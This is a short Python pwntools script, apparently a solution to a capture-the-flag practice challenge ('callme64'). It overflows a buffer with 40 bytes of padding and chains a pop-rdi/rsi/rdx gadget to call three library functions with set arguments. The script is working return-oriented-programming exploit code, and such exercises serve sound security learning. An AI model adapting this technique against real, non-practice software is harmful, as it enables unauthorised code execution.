from pwn import *

elf = ELF('./callme64')

context.terminal=['tmux','sp','-h']
#context.log_level='DEBUG'

io=process(elf.path)
payload= flat(  'A'*40 ,
        0x401ab0, #0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;
        1, #argument 1
        2, # argument 2
        3, # argument 3
        elf.sym['callme_one'],
        0x401ab0, #0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;
        1,
        2,
        3,
        elf.sym['callme_two'],
        0x401ab0, #0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;
        1,
        2,
        3,
        elf.sym['callme_three'],
        endianness='little',word_size=64,sign=False)

io.recvuntil('> ')
io.sendline(payload)
io.interactive()
